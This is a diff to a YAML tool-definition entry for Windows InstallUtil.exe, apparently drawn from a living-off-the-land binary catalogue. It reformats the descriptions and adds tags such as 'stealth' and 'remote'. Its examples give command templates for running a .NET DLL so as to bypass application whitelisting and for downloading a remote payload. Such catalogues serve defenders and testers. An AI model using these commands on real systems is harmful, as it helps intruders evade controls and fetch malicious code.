@@ -2,7 +2,10 @@
 id: windows-execution-installutil
 namespace: windows:execution:installutil
 name: installutil
-description: 'The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe.'
+description: 'The Installer tool is a command-line utility that allows you to install
+  and uninstall server resources by executing the installer components in specified
+  assemblies Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe;
+  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -44,7 +47,12 @@ resource_profile:
 allowed-tools:
 - installutil
 parameters: []
-features: []
+features:
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- remote
+- stealth
 execution:
   template: installutil
   sandbox: execFile
@@ -52,11 +60,14 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Execute the target .NET DLL or EXE. (Use to execute code and bypass application whitelisting)
+- description: Execute the target .NET DLL or EXE. (Use to execute code and bypass
+    application whitelisting)
   command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
-- description: Execute the target .NET DLL or EXE. (Use to execute code and bypass application whitelisting)
+- description: Execute the target .NET DLL or EXE. (Use to execute code and bypass
+    application whitelisting)
   command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
-- description: It will download a remote payload and place it in INetCache. (Downloads payload from remote server)
+- description: It will download a remote payload and place it in INetCache. (Downloads
+    payload from remote server)
   command: InstallUtil.exe {REMOTEURL}
 references:
 - label: ''
@@ -93,7 +104,6 @@ install:
   commands:
   - choco install installutil
 ---
-
 
 # installutil
 
